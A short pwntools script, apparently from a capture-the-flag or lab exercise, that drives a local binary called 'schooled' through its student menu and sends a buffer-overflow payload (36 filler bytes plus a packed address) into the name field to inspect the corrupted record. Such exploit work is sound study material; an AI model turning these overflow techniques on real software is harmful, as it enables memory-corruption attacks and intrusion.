from pwn import *

# Test what the struct looks like after overflow
p = process('./schooled')

# Create student
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'?', b'TestName')
p.sendlineafter(b'?', b'12')
p.sendlineafter(b'?', b'3.5')

# Modify name with overflow
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'?', b'0')
p.sendlineafter(b'?', b'1')

payload = b'A' * 36 + p32(0x0804c02c)
print(f"Payload length: {len(payload)}")
print(f"Payload hex: {payload.hex()}")
p.sendlineafter(b': ', payload)

# Now try to print student info to see what's stored
p.sendlineafter(b'> ', b'4')
p.sendlineafter(b': ', b'0')

print(p.recvall(timeout=1).decode(errors='ignore'))
p.close()
